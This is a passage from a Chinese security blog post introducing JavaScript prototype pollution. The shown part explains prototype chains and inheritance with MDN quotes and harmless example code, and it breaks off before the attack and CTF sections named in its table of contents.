<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="初探JavaScript Prototype Pollution Attack"><meta name="keywords" content="原型链污染攻击,Node.js,JavaScript"><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><title>初探JavaScript Prototype Pollution Attack | M0nk3y's Blog @ D0g3</title><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.1.1'
} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="M0nk3y's Blog @ D0g3" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">0x00    前置基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E4%B8%8E%E7%BB%A7%E6%89%BF"><span class="toc-number">1.1.</span> <span class="toc-text">原型链与继承</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF"><span class="toc-number">1.2.</span> <span class="toc-text">基于原型链的继承</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E5%B1%9E%E6%80%A7"><span class="toc-number">1.2.1.</span> <span class="toc-text">继承属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">继承方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8E%9F%E5%9E%8B"><span class="toc-number">1.2.3.</span> <span class="toc-text">使用原型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%E5%92%8C%E7%94%9F%E6%88%90%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">1.2.4.</span> <span class="toc-text">创建对象和生成原型链</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">0x01 原型链污染攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Hacking-in-CTF"><span class="toc-number">3.</span> <span class="toc-text">0x02    Hacking in CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XNUCA2019-Hardjs"><span class="toc-number">3.1.</span> <span class="toc-text">XNUCA2019 Hardjs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.1.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.1.2.</span> <span class="toc-text">漏洞探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">3.1.3.</span> <span class="toc-text">漏洞验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#js%E5%8E%9F%E5%9E%8B%E9%93%BE%E5%88%B0RCE"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">js原型链到RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ejs-%E8%BF%9B%E8%A1%8C-rce"><span class="toc-number">3.1.3.2.</span> <span class="toc-text">利用ejs 进行 rce</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">0x03    总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text">0x04    参考资料</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"></div><div class="author-info__name text-center">m0nk3y</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">52</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">51</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">9</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.google.com">Google</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">M0nk3y's Blog @ D0g3</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/link">Friends</a><a class="site-page" href="/mytalk">说说</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">初探JavaScript Prototype Pollution Attack</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-15</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web-Security/">Web Security</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">5.6k</span><span class="post-meta__separator">|</span><span>Reading time: 23 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>一直都想学这个, 但是一直都没学, 现在来学一学</p>
<p>总结的目的, 是以后自己忘了或者查资料尽量直接往笔记里找了, 不用到处找, 方便</p>
<p>复现的时候自闭了…</p>
<h1 id="0x00-前置基础知识"><a href="#0x00-前置基础知识" class="headerlink" title="0x00    前置基础知识"></a>0x00    前置基础知识</h1><p>来源: 参考资料1</p>
<h2 id="原型链与继承"><a href="#原型链与继承" class="headerlink" title="原型链与继承"></a>原型链与继承</h2><p>首先, 我们先来看看MDN web docs 是怎么介绍这个原型链的,</p>
<blockquote>
<p>对于使用过基于类的语言 (如 Java 或 C++) 的开发人员来说，JavaScript 有点令人困惑，因为它是动态的，并且本身不提供一个 <code>class</code> 实现。（在 ES2015/ES6 中引入了 <code>class</code> 关键字，但那只是语法糖，JavaScript 仍然是基于原型的）。</p>
<p>当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（ object ）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong> ）。该原型对象也有一个自己的原型对象( <strong>proto</strong> ) ，层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p>
<p>几乎所有 JavaScript 中的对象都是位于原型链顶端的 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> 的实例。</p>
<p>尽管这种原型继承通常被认为是 JavaScript 的弱点之一，但是原型继承模型本身实际上比经典模型更强大。例如，在原型模型的基础上构建经典模型相当简单。</p>
</blockquote>
<p>从介绍中我们可以知道, </p>
<ol>
<li>在EC6之前, JavaScript 是没有<code>class</code> 关键字的</li>
<li>继承时, JavaScript 只有一种结构, 对象</li>
<li>对象(<strong>object</strong>) 都有一个私有属性(<strong>proto</strong>)</li>
<li><strong>proto</strong> 指向构造函数的原型对象(<strong>prototype</strong>)</li>
<li>原型对象(prototype) 也有一个自己的原型对象(proto)</li>
</ol>
<h2 id="基于原型链的继承"><a href="#基于原型链的继承" class="headerlink" title="基于原型链的继承"></a>基于原型链的继承</h2><h3 id="继承属性"><a href="#继承属性" class="headerlink" title="继承属性"></a>继承属性</h3><p>JavaScript 对象是动态的属性“包”（指其自己的属性）。<strong>JavaScript 对象有一个指向一个原型对象的链。当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。</strong></p>
<p>代码演示: </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 让我们从一个自身拥有属性a和b的函数里创建一个对象o：</span></span><br><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="built_in">this</span>.a = <span class="number">1</span>;</span><br><span class="line">   <span class="built_in">this</span>.b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 这么写也一样</span></span><br><span class="line"><span class="comment">function f() &#123;</span></span><br><span class="line"><span class="comment">  this.a = 1;</span></span><br><span class="line"><span class="comment">  this.b = 2;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">let</span> o = <span class="keyword">new</span> f(); <span class="comment">// &#123;a: 1, b: 2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在f函数的原型上定义属性</span></span><br><span class="line">f.prototype.b = <span class="number">3</span>;</span><br><span class="line">f.prototype.c = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不要在 f 函数的原型上直接定义 f.prototype = &#123;b:3,c:4&#125;;这样会直接打破原型链</span></span><br><span class="line"><span class="comment">// o.[[Prototype]] 有属性 b 和 c</span></span><br><span class="line"><span class="comment">//  (其实就是 o.__proto__ 或者 o.constructor.prototype)</span></span><br><span class="line"><span class="comment">// o.[[Prototype]].[[Prototype]] 是 Object.prototype.</span></span><br><span class="line"><span class="comment">// 最后o.[[Prototype]].[[Prototype]].[[Prototype]]是null</span></span><br><span class="line"><span class="comment">// 这就是原型链的末尾，即 null，</span></span><br><span class="line"><span class="comment">// 根据定义，null 就是没有 [[Prototype]]。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 综上，整个原型链如下: </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;a:1, b:2&#125; ---&gt; &#123;b:3, c:4&#125; ---&gt; Object.prototype---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.a); <span class="comment">// 1</span></span><br><span class="line"><span class="comment">// a是o的自身属性吗？是的，该属性的值为 1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.b); <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// b是o的自身属性吗？是的，该属性的值为 2</span></span><br><span class="line"><span class="comment">// 原型上也有一个&#x27;b&#x27;属性，但是它不会被访问到。</span></span><br><span class="line"><span class="comment">// 这种情况被称为&quot;属性遮蔽 (property shadowing)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.c); <span class="comment">// 4</span></span><br><span class="line"><span class="comment">// c是o的自身属性吗？不是，那看看它的原型上有没有</span></span><br><span class="line"><span class="comment">// c是o.[[Prototype]]的属性吗？是的，该属性的值为 4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.d); <span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// d 是 o 的自身属性吗？不是，那看看它的原型上有没有</span></span><br><span class="line"><span class="comment">// d 是 o.[[Prototype]] 的属性吗？不是，那看看它的原型上有没有</span></span><br><span class="line"><span class="comment">// o.[[Prototype]].[[Prototype]] 为 null，停止搜索</span></span><br><span class="line"><span class="comment">// 找不到 d 属性，返回 undefined</span></span><br></pre></td></tr></table></figure>

<h3 id="继承方法"><a href="#继承方法" class="headerlink" title="继承方法"></a>继承方法</h3><blockquote>
<p><strong>JavaScript 并没有其他基于类的语言所定义的“方法”。在 JavaScript 里，任何函数都可以添加到对象上作为对象的属性。函数的继承与其他的属性继承没有差别，包括上面的“属性遮蔽”（这种情况相当于其他语言的方法重写）。</strong></p>
<p><strong>当继承的函数被调用时，<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/this">this</a> 指向的是当前继承的对象，而不是继承的函数所在的原型对象。</strong></p>
</blockquote>
<p>代码示例: </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  a: <span class="number">2</span>,</span><br><span class="line">  m: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.a + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.m()); <span class="comment">// 3</span></span><br><span class="line"><span class="comment">// 当调用 o.m 时，&#x27;this&#x27; 指向了 o.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="built_in">Object</span>.create(o);</span><br><span class="line"><span class="comment">// p是一个继承自 o 的对象</span></span><br><span class="line"></span><br><span class="line">p.a = <span class="number">4</span>; <span class="comment">// 创建 p 的自身属性 &#x27;a&#x27;</span></span><br><span class="line"><span class="built_in">console</span>.log(p.m()); <span class="comment">// 5</span></span><br><span class="line"><span class="comment">// 调用 p.m 时，&#x27;this&#x27; 指向了 p</span></span><br><span class="line"><span class="comment">// 又因为 p 继承了 o 的 m 函数</span></span><br><span class="line"><span class="comment">// 所以，此时的 &#x27;this.a&#x27; 即 p.a，就是 p 的自身属性 &#x27;a&#x27; </span></span><br></pre></td></tr></table></figure>

<h3 id="使用原型"><a href="#使用原型" class="headerlink" title="使用原型"></a>使用原型</h3><p>在 JavaScript 中，函数（function）是允许拥有属性的。所有的函数会有一个特别的属性 —— <code>prototype</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log( doSomething.prototype );</span><br><span class="line"><span class="comment">// 和声明函数的方式无关，</span></span><br><span class="line"><span class="comment">// JavaScript 中的函数永远有一个默认原型属性。</span></span><br><span class="line"><span class="keyword">var</span> doSomething = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log( doSomething.prototype );</span><br></pre></td></tr></table></figure>

<p>在console 中的运行结果, 我在我自己电脑上的Chrome/Firefox 上运行的结果不是这样的… 为了学习的话, 直接抄代码过来好了,,我也不知道为什么…. (我知道了 因为我没有把点开…😄)</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">constructor</span>: ƒ doSomething(),</span><br><span class="line">    __proto__: &#123;</span><br><span class="line">        <span class="keyword">constructor</span>: ƒ Object(),</span><br><span class="line">        hasOwnProperty: ƒ hasOwnProperty(),</span><br><span class="line">        isPrototypeOf: ƒ isPrototypeOf(),</span><br><span class="line">        propertyIsEnumerable: ƒ propertyIsEnumerable(),</span><br><span class="line">        toLocaleString: ƒ toLocaleString(),</span><br><span class="line">        toString: ƒ toString(),</span><br><span class="line">        valueOf: ƒ valueOf()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>给<code>doSomething</code>函数的原型对象添加新属性</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">doSomething.prototype.foo = <span class="string">&quot;bar&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log( doSomething.prototype );</span><br></pre></td></tr></table></figure>

<p>运行结果: </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    foo: <span class="string">&quot;bar&quot;</span>,</span><br><span class="line">    <span class="keyword">constructor</span>: ƒ doSomething(),</span><br><span class="line">    __proto__: &#123;</span><br><span class="line">        <span class="keyword">constructor</span>: ƒ Object(),</span><br><span class="line">        hasOwnProperty: ƒ hasOwnProperty(),</span><br><span class="line">        isPrototypeOf: ƒ isPrototypeOf(),</span><br><span class="line">        propertyIsEnumerable: ƒ propertyIsEnumerable(),</span><br><span class="line">        toLocaleString: ƒ toLocaleString(),</span><br><span class="line">        toString: ƒ toString(),</span><br><span class="line">        valueOf: ƒ valueOf()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>new</code>操作符来创建基于这个原型对象的doSomething<code>实例</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">doSomething.prototype.foo = <span class="string">&quot;bar&quot;</span>; <span class="comment">// add a property onto the prototype</span></span><br><span class="line"><span class="keyword">var</span> doSomeInstancing = <span class="keyword">new</span> doSomething();</span><br><span class="line">doSomeInstancing.prop = <span class="string">&quot;some value&quot;</span>; <span class="comment">// add a property onto the object</span></span><br><span class="line"><span class="built_in">console</span>.log( doSomeInstancing );</span><br></pre></td></tr></table></figure>

<p>运行结果: </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    prop: <span class="string">&quot;some value&quot;</span>,</span><br><span class="line">    __proto__: &#123;</span><br><span class="line">        foo: <span class="string">&quot;bar&quot;</span>,</span><br><span class="line">        <span class="keyword">constructor</span>: ƒ doSomething(),</span><br><span class="line">        __proto__: &#123;</span><br><span class="line">            <span class="keyword">constructor</span>: ƒ Object(),</span><br><span class="line">            hasOwnProperty: ƒ hasOwnProperty(),</span><br><span class="line">            isPrototypeOf: ƒ isPrototypeOf(),</span><br><span class="line">            propertyIsEnumerable: ƒ propertyIsEnumerable(),</span><br><span class="line">            toLocaleString: ƒ toLocaleString(),</span><br><span class="line">            toString: ƒ toString(),</span><br><span class="line">            valueOf: ƒ valueOf()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果属性不存在 <code>doSomeInstancing</code> 的 <code>__proto__</code> 的  <code>__proto__</code> 中， 那么就会在<code>doSomeInstancing</code> 的 <code>__proto__</code> 的  <code>__proto__</code> 的  <code>__proto__</code> 中查找。然而, 这里存在个问题：<code>doSomeInstancing</code> 的 <code>__proto__</code> 的  <code>__proto__</code> 的  <code>__proto__</code> 其实不存在。因此，只有这样，在 <code>__proto__</code> 的整个原型链被查看之后，这里没有更多的 <code>__proto__</code> ， 浏览器断言该属性不存在，并给出属性值为 <code>undefined</code> 的结论。</p>
<h3 id="创建对象和生成原型链"><a href="#创建对象和生成原型链" class="headerlink" title="创建对象和生成原型链"></a>创建对象和生成原型链</h3><p>使用语法结构创建对象: </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// o 这个对象继承了 Object.prototype 上面的所有属性</span></span><br><span class="line"><span class="comment">// o 自身没有名为 hasOwnProperty 的属性</span></span><br><span class="line"><span class="comment">// hasOwnProperty 是 Object.prototype 的属性</span></span><br><span class="line"><span class="comment">// 因此 o 继承了 Object.prototype 的 hasOwnProperty</span></span><br><span class="line"><span class="comment">// Object.prototype 的原型为 null</span></span><br><span class="line"><span class="comment">// 原型链如下:</span></span><br><span class="line"><span class="comment">// o ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&quot;yo&quot;</span>, <span class="string">&quot;whadup&quot;</span>, <span class="string">&quot;?&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组都继承于 Array.prototype </span></span><br><span class="line"><span class="comment">// (Array.prototype 中包含 indexOf, forEach 等方法)</span></span><br><span class="line"><span class="comment">// 原型链如下:</span></span><br><span class="line"><span class="comment">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数都继承于 Function.prototype</span></span><br><span class="line"><span class="comment">// (Function.prototype 中包含 call, bind等方法)</span></span><br><span class="line"><span class="comment">// 原型链如下:</span></span><br><span class="line"><span class="comment">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></span><br></pre></td></tr></table></figure>

<p>使用构造器创建对象: </p>
<p>在 JavaScript 中，构造器其实就是一个普通的函数。当使用 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/new">new 操作符</a> 来作用这个函数时，它就可以被称为构造方法（构造函数）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Graph</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.vertices = [];</span><br><span class="line">  <span class="built_in">this</span>.edges = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Graph.prototype = &#123;</span><br><span class="line">  addVertex: <span class="function"><span class="keyword">function</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.vertices.push(v);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g = <span class="keyword">new</span> Graph();</span><br><span class="line"><span class="comment">// g 是生成的对象，他的自身属性有 &#x27;vertices&#x27; 和 &#x27;edges&#x27;。</span></span><br><span class="line"><span class="comment">// 在 g 被实例化时，g.[[Prototype]] 指向了 Graph.prototype</span></span><br></pre></td></tr></table></figure>

<p>使用<code>Object.create</code>创建对象</p>
<p>ECMAScript 5 中引入了一个新方法：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create"><code>Object.create()</code></a>。可以调用这个方法来创建一个新对象。新对象的原型就是调用 create 方法时传入的第一个参数：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;; </span><br><span class="line"><span class="comment">// a ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">Object</span>.create(a);</span><br><span class="line"><span class="comment">// b ---&gt; a ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"><span class="built_in">console</span>.log(b.a); <span class="comment">// 1 (继承而来)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = <span class="built_in">Object</span>.create(b);</span><br><span class="line"><span class="comment">// c ---&gt; b ---&gt; a ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// d ---&gt; null</span></span><br><span class="line"><span class="built_in">console</span>.log(d.hasOwnProperty); <span class="comment">// undefined, 因为d没有继承Object.prototype</span></span><br></pre></td></tr></table></figure>

<p>使用<code>class</code> 关键字创建对象: </p>
